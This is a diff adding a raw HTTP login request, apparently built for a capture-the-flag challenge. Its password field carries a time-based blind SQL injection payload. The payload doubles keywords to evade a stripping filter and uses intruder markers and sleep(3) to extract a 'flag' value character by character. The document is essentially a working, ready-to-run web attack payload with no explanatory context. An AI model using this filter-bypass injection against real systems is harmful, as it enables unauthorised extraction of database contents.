@@ -1,0 +1,27 @@
+POST / HTTP/1.1
+Host: 10.12.153.8:31141
+Content-Lenth: 339
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.12.153.8:31141/
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLlolnABEnAx7J8Bp
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.12.153.8:31141/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryLlolnABEnAx7J8Bp
+Content-Disposition: form-data; name="username"
+
+111
+------WebKitFormBoundaryLlolnABEnAx7J8Bp
+Content-Disposition: form-data; name="password"
+
+222 " oorr if(ascii(substr((sselectelect fflaglag frroom fflaglag limit 0,1),§index§,1))=§value§,sleep(3),1)#
+------WebKitFormBoundaryLlolnABEnAx7J8Bp
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryLlolnABEnAx7J8Bp--
